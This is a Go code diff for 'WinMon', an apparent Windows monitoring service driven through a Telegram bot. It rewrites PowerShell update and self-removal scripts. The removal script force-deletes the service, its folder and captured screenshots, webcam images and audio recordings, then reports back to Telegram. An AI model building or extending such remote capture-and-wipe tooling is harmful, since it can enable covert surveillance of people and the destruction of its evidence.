@@ -5,7 +5,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strings"
 	"syscall"
 
 	"winmon/internal/service"
@@ -40,19 +39,32 @@ func UpdateService(tempExePath, botToken string, chatID int64) error {
 
 	scriptPath := filepath.Join(service.GetSharedTempDir(), "winmon_update.ps1")
 
-	// Escape single quotes and slashes for PowerShell compatibility
-	escapedTemp := strings.ReplaceAll(tempExePath, "\\", "\\\\")
-	escapedExe := strings.ReplaceAll(exePath, "\\", "\\\\")
+	slashedTemp := filepath.ToSlash(tempExePath)
+	slashedExe := filepath.ToSlash(exePath)
+
+	var startCmd string
+	var successMsg string
+	if service.IsRunningAsService() {
+		startCmd = "Start-Service -Name WinMon -ErrorAction SilentlyContinue"
+		successMsg = "🟢 WinMon service has been updated successfully!"
+	} else {
+		startCmd = fmt.Sprintf(`Start-Process -FilePath "%s" -ArgumentList "-console"`, slashedExe)
+		successMsg = "🟢 WinMon (Console Mode) has been updated successfully!"
+	}
 
 	psScript := fmt.Sprintf(`
+Set-Location -Path "C:\"
 Start-Sleep -Seconds 2
-Stop-Service -Name WinMon -Force
+Stop-Service -Name WinMon -Force -ErrorAction SilentlyContinue
+Stop-Process -Name winmon -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
 Copy-Item -Path "%s" -Destination "%s" -Force
-Start-Service -Name WinMon
-$body = @{ chat_id = "%d"; text = "🟢 WinMon service has been updated successfully!" }
+Remove-Item -Path "%s" -Force
+%s
+$body = @{ chat_id = "%d"; text = "%s" }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
-`, escapedTemp, escapedExe, chatID, botToken)
+`, slashedTemp, slashedExe, slashedTemp, startCmd, chatID, successMsg, botToken)
 
 	err = os.WriteFile(scriptPath, []byte(psScript), 0644)
 	if err != nil {
@@ -80,12 +92,13 @@ func ImplodeService(botToken string, chatID int64) error {
 	statePath := filepath.Join(exeDir, "state.json")
 	scriptPath := filepath.Join(service.GetSharedTempDir(), "winmon_implode.ps1")
 
-	// Escape single quotes and slashes for PowerShell compatibility
-	escapedExe := strings.ReplaceAll(exePath, "\\", "\\\\")
-	escapedConfig := strings.ReplaceAll(configPath, "\\", "\\\\")
-	escapedState := strings.ReplaceAll(statePath, "\\", "\\\\")
+	slashedExe := filepath.ToSlash(exePath)
+	slashedConfig := filepath.ToSlash(configPath)
+	slashedState := filepath.ToSlash(statePath)
+	slashedExeDir := filepath.ToSlash(exeDir)
 
 	psScript := fmt.Sprintf(`
+Set-Location -Path "C:\"
 Start-Sleep -Seconds 2
 Stop-Service -Name WinMon -Force -ErrorAction SilentlyContinue
 $limit = 10
@@ -96,14 +109,28 @@ while ((Get-Process -Name winmon -ErrorAction SilentlyContinue) -and ($limit -gt
 Stop-Process -Name winmon -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 & sc.exe delete WinMon
+Start-Sleep -Seconds 3
+
+# 1. Clean up target executable, config, and state
 Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "%s" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Temp\winmon_service.log" -Force -ErrorAction SilentlyContinue
+
+# 2. Clean up installation folder
+Remove-Item -Path "%s" -Recurse -Force -ErrorAction SilentlyContinue
+
+# 3. Clean up all temporary files (screenshots, webcams, audio recordings, logs)
+Remove-Item -Path "C:\Windows\Temp\winmon_*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\helper_*" -Force -Recurse -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\screenshot.jpg" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\webcam.jpg" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\record.gif" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Temp\audio.wav" -Force -ErrorAction SilentlyContinue
+
 $body = @{ chat_id = "%d"; text = "💥 WinMon service and all associated local files have been completely removed from this PC." }
 Invoke-RestMethod -Uri "https://api.telegram.org/bot%s/sendMessage" -Method Post -Body $body
 Remove-Item -Path $MyInvocation.MyCommand.Path -Force
-`, escapedExe, escapedConfig, escapedState, chatID, botToken)
+`, slashedExe, slashedConfig, slashedState, slashedExeDir, chatID, botToken)
 
 	err = os.WriteFile(scriptPath, []byte(psScript), 0644)
 	if err != nil {
